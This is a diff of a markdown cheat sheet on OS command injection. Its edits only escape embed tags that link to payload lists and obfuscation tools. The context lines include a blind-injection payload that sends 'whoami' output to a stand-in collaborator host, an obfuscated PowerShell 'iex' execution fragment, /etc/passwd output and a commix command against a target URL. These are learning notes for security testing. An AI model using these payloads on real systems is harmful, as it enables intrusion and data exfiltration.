@@ -225,7 +225,7 @@ ping burpcollaborator
 `ping burpcollaborator`
 ```
 
-{% embed url="<https://medium.com/@ashkrypt/blind-os-command-injection-87910f0d2276>" %}
+&#123;% embed url="<https://medium.com/@ashkrypt/blind-os-command-injection-87910f0d2276>" %}
 
 `ping $(whoami).collaborator_server_dot_com`
 
@@ -320,7 +320,7 @@ drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..
 
 More space filter bypass:
 
-{% embed url="<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space>" %}
+&#123;% embed url="<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space>" %}
 
 ### Bypassing Other Blacklisted Characters <a href="#bypassing-other-blacklisted-characters" id="bypassing-other-blacklisted-characters"></a>
 
@@ -563,7 +563,7 @@ PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::Fr
 
 More Technique
 
-{% embed url="<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion>" %}
+&#123;% embed url="<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion>" %}
 
 #### Obfuscated Commands <a href="#obfuscated-commands" id="obfuscated-commands"></a>
 
@@ -663,7 +663,7 @@ Payload 2 - set to obfuscated command
 
 #### Linux (Bashfuscator) <a href="#linux-bashfuscator" id="linux-bashfuscator"></a>
 
-{% embed url="<https://github.com/Bashfuscator/Bashfuscator>" %}
+&#123;% embed url="<https://github.com/Bashfuscator/Bashfuscator>" %}
 
 ```
 $ git clone https://github.com/Bashfuscator/Bashfuscator
@@ -704,7 +704,7 @@ root:x:0:0:root:/root:/bin/bash
 
 #### Windows (DOSfuscation) <a href="#windows-dosfuscation" id="windows-dosfuscation"></a>
 
-{% embed url="<https://github.com/danielbohannon/Invoke-DOSfuscation>" %}
+&#123;% embed url="<https://github.com/danielbohannon/Invoke-DOSfuscation>" %}
 
 ```
 PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
@@ -743,11 +743,11 @@ Tip: If we do not have access to a Windows VM, we can run the above code on a Li
 
 ### Payloads <a href="#payloads" id="payloads"></a>
 
-{% embed url="<https://github.com/payloadbox/command-injection-payload-list>" %}
+&#123;% embed url="<https://github.com/payloadbox/command-injection-payload-list>" %}
 
 ### Tools <a href="#tools" id="tools"></a>
 
-{% embed url="<https://github.com/commixproject/commix>" %}
+&#123;% embed url="<https://github.com/commixproject/commix>" %}
 
 ```
 commix --url=”http://target.com/vuln.php?param=1"
